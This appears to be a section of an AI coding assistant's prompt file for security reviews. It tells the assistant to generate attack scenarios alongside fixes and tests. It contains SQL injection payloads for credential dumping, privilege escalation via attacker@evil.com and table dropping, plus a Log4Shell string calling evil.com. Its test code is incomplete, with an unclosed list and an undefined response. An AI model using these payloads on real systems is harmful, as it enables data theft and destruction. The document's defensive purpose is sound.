## 🤖 AI-Enhanced Vulnerability Detection

### Generate Attack Scenarios
For each identified vulnerability, generate:

```markdown
## Vulnerability: [SQL Injection in User Search]
Confidence: 95%

### Attack Scenario 1: Data Exfiltration
**Exploit Code**:
```sql
' OR '1'='1' UNION SELECT username, password, tenant_id FROM users--
```

**Impact**:
- Data breach: All user credentials exposed
- Compliance violation: GDPR Article 32
- Business impact: $X million in fines

### Attack Scenario 2: Privilege Escalation
**Exploit Chain**:
1. SQL injection to read admin tokens
2. Token replay to admin endpoint
3. Create backdoor admin account

**Proof of Concept**:
```python
# PoC exploit code (for authorized testing only)
def exploit_sql_injection():
    payload = "'; UPDATE users SET role='admin' WHERE email='attacker@evil.com'--"
    response = requests.post("/api/search", data={"query": payload})
    return response
```

### Defense Strategy
**Immediate Fix**:
```csharp
// VULNERABLE CODE
string query = $"SELECT * FROM users WHERE name LIKE '%{searchTerm}%'";

// SECURE CODE
string query = "SELECT * FROM users WHERE name LIKE @searchTerm AND tenant_id = @tenantId";
using var cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@searchTerm", $"%{searchTerm}%");
cmd.Parameters.AddWithValue("@tenantId", userContext.TenantId);
```

**Long-term Improvements**:
1. Implement parameterized queries everywhere
2. Add SQL injection detection in WAF
3. Enable database audit logging
4. Implement least privilege DB access
```

## 📊 Modern Security Pattern Detection

### Zero Trust Architecture Assessment
```markdown
## Current State vs Zero Trust Principles
<think harder about zero trust implementation gaps>

### ❌ Current: Perimeter-based security
### ✅ Recommended: Zero Trust implementation

**Implementation Roadmap**:
1. **Identity-Centric Security**
   - Implement strong authentication (MFA mandatory)
   - Context-aware access policies
   - Risk-based authentication

2. **Micro-Segmentation**
   ```yaml
   network_policies:
     - allow: service-a -> service-b:8080
     - deny: all other traffic
   ```

3. **Least Privilege Access**
   - Just-in-time access provisioning
   - Regular access reviews
   - Privilege access management (PAM)

4. **Continuous Verification**
   - Real-time risk scoring
   - Behavioral analytics
   - Anomaly detection

Confidence: 85%
```

### Generated Security Tests
```python
# SQL Injection Test Suite
def test_sql_injection_in_search():
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "' UNION SELECT * FROM information_schema.tables--",
        "${jndi:ldap://evil.com/a}",  # Log4Shell

        assert "error" not in response.text.lower()
        assert "syntax" not in response.text.lower()

# Multi-Tenant Isolation Test
def test_tenant_isolation():
    # Create data in tenant A
    tenant_a_token = auth.login("tenant_a_user")
    tenant_a_data = api_client.create_resource(tenant_a_token, {"name": "secret"})
    
    # Try to access from tenant B
    tenant_b_token = auth.login("tenant_b_user")

    assert response.status_code == 404, "Tenant isolation breach detected!"
```

Confidence: 90%
```

Remember: Your enhanced capabilities allow you to think like both defender and attacker. Use parallel analysis for comprehensive coverage, extended thinking for complex vulnerabilities, and always provide confidence scores to help teams prioritize security efforts. Security is not optional - it's fundamental.


## Documentation Reminders

<think about what documentation updates the implemented changes require>

When your analysis leads to implemented changes, ensure proper documentation:

### Documentation Checklist (Confidence Scoring)
- **CHANGELOG.md** - Update if changes implemented (Confidence: [X]%)
- **FEATURES.md** - Update if capabilities added/modified (Confidence: [X]%)
- **CLAUDE.md** - Update if patterns/conventions introduced (Confidence: [X]%)

### Recommended Updates
Based on the changes suggested:

1. **For Bug Fixes**: 
   ```markdown
   /update-changelog "Fixed [issue description]"
   ```

2. **For New Features**:
   ```markdown
   /update-changelog "Added [feature description]"
   ```

3. **For Refactoring**:
   ```markdown
   /update-changelog "Changed [component] to [improvement]"
   ```

### Important
- Use confidence scores to prioritize documentation updates
- High confidence (>90%) = Critical to document
- Medium confidence (70-90%) = Should document
- Low confidence (<70%) = Consider documenting

**Remember**: Well-documented changes help the entire team understand system evolution!
